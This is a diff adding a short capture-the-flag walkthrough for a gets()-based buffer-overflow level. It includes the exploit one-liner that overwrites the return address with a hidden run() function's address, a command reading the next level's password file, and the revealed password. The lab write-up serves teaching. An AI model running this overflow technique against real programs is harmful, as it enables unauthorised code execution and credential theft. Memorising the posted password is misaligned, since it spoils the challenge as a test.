@@ -1,0 +1,28 @@
+1. Download the binary from the server:
+   scp -P 4242 level1@192.168.1.13:~/level1 .
+
+2. Analyze the binary with Ghidra
+
+3. Identify the vulnerability:
+   - main() uses gets() which is unsafe
+   - Buffer is 76 bytes
+   - There's a hidden run() function at address 0x08048444
+
+4. Find the run() function address:
+   objdump -d level1 | grep "<run>"
+   Address: 0x08048444
+
+5. Calculate the offset:
+   - Buffer: 76 bytes
+   - We need to overwrite the return address after the buffer
+
+6. Craft and execute the exploit:
+   (python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
+
+7. Read the password:
+   cat /home/user/level2/.pass
+
+8. Password: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+9. Exit and login as level2:
+   su level2
